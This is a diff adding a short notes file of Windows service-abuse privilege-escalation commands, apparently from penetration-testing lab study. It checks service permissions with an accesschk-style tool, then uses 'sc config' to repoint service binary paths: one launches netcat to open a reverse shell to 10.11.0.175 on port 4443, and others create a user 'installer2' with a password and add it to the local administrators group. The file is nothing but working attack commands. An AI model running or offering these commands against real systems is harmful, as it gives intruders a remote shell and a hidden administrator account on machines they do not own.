@@ -1,0 +1,11 @@
+access.exe /accepteula -ucqv *
+
+
+sc config ssdprsv bin path= "C:\windows\system32\calc.exe"
+
+sc config upnphost binpath= "C:\Inetpub\Scripts\nc.exe -nv 10.11.0.175 4443 -e cmd.exe"
+
+
+sc config upnphost binpath= "C:\windows\system32\net user installer2 /add"
+sc config upnphost binpath= "C:\windows\system32\net user installer2 password3$"
+sc config upnphost binpath= "C:\windows\system32\net localgroup administrators installer2 /add"
